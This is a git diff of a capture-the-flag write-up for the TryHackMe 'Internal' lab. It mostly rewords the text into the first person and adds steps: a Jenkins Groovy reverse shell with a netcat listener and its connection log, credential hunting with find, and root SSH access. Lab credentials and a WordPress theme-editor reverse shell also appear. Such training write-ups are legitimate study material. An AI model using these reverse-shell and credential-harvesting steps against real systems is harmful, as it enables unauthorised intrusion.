@@ -31,7 +31,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 31.00 seconds
 ```
-- We can see there is a open `http` on port `80`
+- I can see there is a open `http` on port `80`
 - Also note of `8080/tcp closed http-proxy`
 
 - dirsearch to search for hidden directories and files on the web server: `dirsearch -u internal.thm -x 400,500 -r -t 100`
@@ -70,7 +70,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.00 seconds
                                                                              
 Task Completed
 ```
-- Under the directory `http://internal.thm/blog/wp-login.php` we have a login page for `wordpress`
+- Under the directory `http://internal.thm/blog/wp-login.php` there is a login page for `wordpress`
 
 ![alt text](images/internal_WP-LOGIN-SS.png)
 - Basic enumeration on the page with the login credentials using `admin:admin` can see that there is a active user called admin
@@ -101,8 +101,8 @@ I was able to find that the login credentials are Username: admin, Password: my2
 ```
 
 ## Gaining Access To The Machine:
-- Since we have an admin account we can use the `Theme Editor` to get ourselves a reverse shell on the machine
-- We can use this `php-reverse-shell` from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
+- Since I have an admin account I can use the `Theme Editor` to get myself a reverse shell on the machine
+- I can use this `php-reverse-shell` from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
 - I'm going to replace the `archive.php` directory
 
@@ -136,15 +136,20 @@ Aubreanna needed these credentials for something later.  Let her know you have t
 aubreanna:bubb13guM!@#123
 ```
 
-- We now have some `SSH` login credentials:
+- I now have some `SSH` login credentials:
 ```
 aubreanna:bubb13guM!@#123
+```
+
+- After connecting I can `ls` and see the `user.txt` getting my first flag
+```
+THM{***************}
 ```
 
 ## Post SSH:
 
 - Now that I'm connected fully to `aubreanna`'s machine I want to try and take a look at the closed webserver I seen earlier from my nmap scan
-- Using `netstat -ano` we can look at the network connections on the machine
+- Using `netstat -ano` I can look at the network connections on the machine
 - **netstat -ano Results:**
 ```
 Active Internet connections (servers and established)
@@ -184,7 +189,45 @@ raw6       0      0 :::58                   :::*                    7           
 
 ![alt text](fuzz_res.png)
 
-- We now have the `Jenkins` login credentials:
+- I now have the `Jenkins` login credentials:
 ```
 admin:spongebob
+```
+
+- Using the `Script Console` in `Manage Jenkins` I can attempt to get another reverse shell on this machine using `Groovy script`
+- I can use this `groovy-script-reverse-shell` from [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
+- I'm going to chage the `String cmd="cmd.exe";` to go to `/bin/sh`. Doing this will allow as to have full access to the machine's command-line interface
+
+![alt text](groozy.png)
+
+- In my terminal I have the following listener setup: `rlwrap nc -lvnp 8044`
+
+- When I run this am I am able to get a successful reverse shell connection
+```
+listening on [any] 8044 ...
+connect to [10.2.17.217] from (UNKNOWN) [10.10.103.219] 51840
+id
+uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
+```
+
+- Now that I am on a new machine I'm going to look for text files again to try and hopefully get more information/credentials using `find / -name "*.txt" -type f 2>/dev/null`
+- There is another text file in `/opt` directory on this machine called `note.txt`
+- **Contents of `wp-save.txt`:**
+```
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+```
+
+- I now have `SSH` login credentials for root:
+```
+root:tr0ub13guM!@#123
+```
+
+- After connecting I can `ls` and see the `root.txt` getting my second and last flag
+```
+THM{***************}
 ```
